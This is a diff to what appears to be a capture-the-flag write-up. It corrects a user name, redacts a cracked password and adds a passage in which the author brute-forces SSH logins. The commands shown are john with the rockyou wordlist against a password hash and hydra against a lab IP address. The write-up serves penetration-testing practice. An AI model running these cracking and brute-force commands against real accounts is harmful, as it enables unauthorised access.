@@ -156,13 +156,18 @@ Ba2k3t
 
 ## Password Crack. 
 
-Having the hash for all the users, I managed to crack one called gandolf
+Having the hash for all the users, I managed to crack one called gandalf
 
-gandolf:$P$BGOXSxRtzMKFKkRZ246loTIXH5AFQm/
+gandolf:$P$BGOXSxRtzMKFKkRZ246loTIXH5AFQm/:PASSWORD_REDACTED
 
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 
-Using this we can ssh onto the box as gandalf. 
+Trying this password for the ssh connection seemed to fail, so back to brute force of all users 
+
+```
+echo "john william james Evelyn Mason harper gandalf" | tr " " "\n" > users.txt
+hydra  -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.121 -f -V
+```
 
